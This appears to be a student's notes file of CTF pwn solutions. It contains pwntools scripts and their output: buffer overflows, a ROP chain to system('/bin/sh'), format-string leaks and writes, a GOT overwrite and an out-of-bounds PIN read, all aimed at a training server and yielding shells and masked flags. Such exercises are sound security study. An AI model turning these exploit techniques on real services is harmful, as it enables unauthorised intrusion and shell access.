#

```
Level 1： 
1-1.pass  ==> gdb-peda
1-2.gohome
1-4.echo_server

1-8.張元_Pwn-7 ==>有問題

- 2-6.oob1-sean_Pwn-1
- 2-7.oob2-sean_Pwn-2
- 2-8.oob3-sean_Pwn-3
- 2-9.oob4-sean_Pwn-4
- 2-10.oob5-sean_Pwn-5

Pwn-1.baby_fmt
Pwn-2.fmt-1
Pwn-2.fmt-2  ==> printf() 可以寫入
Pwn-2.fmt-3  ==> printf() 可以寫入

```


```
Buffer Overflow
GOT-hijacking
Format String
```
# 1-1.pass 
```
from pwn import *

#r = process('./pass')
#r = remote('localhost', 58000)
r = remote('120.114.62.213', 6125)

# payload = 'A'*28
payload = b'A'*28

r.sendline(payload + p64(0xdeadbeef))

r.interactive()
```
```
What is the right way to pack a payload with Python3's pwntools
https://reverseengineering.stackexchange.com/questions/19776/what-is-the-right-way-to-pack-a-payload-with-python3s-pwntools
```
```
KAKI 64-BIT
python2 -m pip install --user pwntools

from pwn import *

#r = process('./pass')
#r = remote('localhost', 58000)
r = remote('120.114.62.213', 6125)

# payload = 'A'*28
payload = 'A'*28

r.sendline(payload + p64(0xdeadbeef))

r.interactive()
```
```
python tp1.py  <==PYTHON 2
[+] Opening connection to 120.114.62.213 on port 6125: Done
[*] Switching to interactive mode
Billy left his key in the locked room.
However, he forgot the token of the room.
Do you know what's the key?Door open. OwO
FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}
MyFirstCTF{xxxxxxxxxxxxxxxxxxxxxx}
[*] Got EOF while reading in interactive

```
## 1-2.gohome 
```
from pwn import *

# r = process('./gohome')
# r = remote('localhost', 58000)
# nc 120.114.62.213 6126
r = remote('120.114.62.213', 6126)

payload = b'A'*40
Billyshouse = 0x4006c6

r.recvuntil('?')
r.sendline(payload + p64(Billyshouse))
#r.sendline(payload + str(p64(Billyshouse)))

r.interactive()
```
```
from pwn import *

# r = process('./gohome')
# r = remote('localhost', 58000)
# nc 120.114.62.213 6126
r = remote('120.114.62.213', 6126)

# payload = 'A'*40  (python 2和python3寫法不同)
payload = b'A'*40
Billyshouse = 0x4006c6

r.recvuntil('?')
r.sendline(payload + p64(Billyshouse))
#r.sendline(payload + str(p64(Billyshouse)))

r.interactive()
```
## 1-4.echo_server 
### PYTHON2 程式
```
# nc 120.114.62.213 6129
from pwn import *

#r = process('./echo_server')
#r = remote('localhost', 58000)
# nc 120.114.62.213 6129

r = remote('120.114.62.213', 6129)

bin_sh = 0x4009c0
payload = 'A'*56
pop_rdi = 0x400923
system = 0x400570

r.sendline(payload + p64(pop_rdi) + p64(bin_sh) + p64(system))

r.interactive()
```
```
python2 qq1.py 
[+] Opening connection to 120.114.62.213 on port 6129: Done
[*] Switching to interactive mode
========= echo server =========
This is an echo server.
It will echo whatever you type.
But not something like:
/bin/sh
cat /home/ctf/flag
===============================
> $ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ find . -name flag
find: `./proc/tty/driver': Permission denied
find: `./proc/1/task/1/fd': Permission denied
find: `./proc/1/task/1/fdinfo': Permission denied
find: `./proc/1/task/1/ns': Permission denied
find: `./proc/1/fd': Permission denied
find: `./proc/1/map_files': Permission denied
find: `./proc/1/fdinfo': Permission denied
find: `./proc/1/ns': Permission denied
find: `./root': Permission denied
./home/ctf/flag
find: `./var/spool/cron/crontabs': Permission denied
find: `./var/spool/rsyslog': Permission denied
find: `./var/cache/ldconfig': Permission denied
$ cat /home/ctf/flag
MyFirstCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

## 1-8.張元_Pwn-7 OK
```
from pwn import *
# nc 120.114.62.213 2117
# r = remote('localhost', 2117)
r = remote('120.114.62.213', 2117)

r.recvuntil("\n")
r.sendline(str(0x100001))
r.recvuntil("\n")
r.sendline(str(0x64))
r.sendline(str(0x100))
r.sendline(str(0xfaceb00c))
r.recvuntil("\n")
r.sendline(str(0x60107c))
r.interactive()
```
```
python3 ttt4.py
[+] Opening connection to 120.114.62.213 on port 2117: Done
[*] Switching to interactive mode
Stage 2 completed
Stage 3
Stage 3 completed
Congrat! Here is your shell!
$ ls
binary
flag
$ cat flag
BreakAllCTF{AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
# baby_fmt
```
## nc 120.114.62.213 4001
#!/usr/bin/env python

from pwn import *
import base64

context.arch = 'amd64'

host = '120.114.62.213'
y = remote( host , 4001 )

y.send( '%p.' * 11 + 'AB' )
o = y.recvuntil( 'AB' )

o = o.split( '.' )

flag = ''

for i in o[5:-1]:
  flag += p64( eval( i ) )

print flag

y.interactive()
```
```
python2 m2.py 
[+] Opening connection to 120.114.62.213 on port 4001: Done
FLAG{xxxxxxxxxxxxxxxxxxx}\x00z����\x00
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
# Pwn-2.fmt-1
```
# nc 120.114.62.213 4002
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

host , port = '120.114.62.213' , 4002
y = remote( host , port )

secret = 0x404050

p = '%9$s'.ljust( 8 , '\0' ) + p64( secret )

y.sendafter( ':' , p )
y.sendafter( ':' , y.recv(0x10) )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```
```
python2 m1.py 
[+] Opening connection to 120.114.62.213 on port 4002: Done
[*] Switching to interactive mode
FLAG{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}

[*] Got EOF while reading in interactive
```

# fmt-2  PYTHON2 ok
```
# nc 120.114.62.213 4003
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

host , port = '120.114.62.213' , 4003
y = remote( host , port )

magic = 0x404050
p = '%45068c%10$hn%19138c%11$hn'.ljust( 0x20 , '\0' ) + p64( magic ) + p64( magic + 2 )

y.sendafter( ':' , p[:-2] )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```
#
```
# nc 120.114.62.213 4004
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
l = ELF( './libc-2.27.so' )

host , port = '120.114.62.213' , 4004
y = remote( host , port )

main = 0x4011b3
exit_got = 0x404030
printf_got = 0x404018

p = flat(
( '%{}c%12$hhn%{}c%13$hn'.format( 0x40 , 0x11b3 - 0x40 ) ).ljust( 0x30 , '\0' ), # 6
exit_got + 2, exit_got)

y.sendline( p )
```
# oob1-sean_Pwn-1
```
#!/usr/bin/env python

from pwn import *

context.arch='amd64'
r = remote('120.114.62.213', 3111)

r.recvuntil('User ID: ')
r.sendline('-4')
r.recvuntil('PIN: ')
r.sendline('123')

l = r.recvuntil('] ... ')
pin = u32(l[12:16])

print 'pin =', pin

r.recvuntil('User ID: ')
r.sendline('0')
r.recvuntil('PIN: ')
r.sendline(str(pin))
r.recvuntil('Ok!\n')
r.interactive()
```
```
ython2 o1.py 
[+] Opening connection to 120.114.62.213 on port 3111: Done
pin = 960298567
[*] Switching to interactive mode

$ ls
flag.txt
oob1
$ cat flag.txt
BreakALLCTF{xxxxxxxxxxxxxxxxxxxxx}$  
```
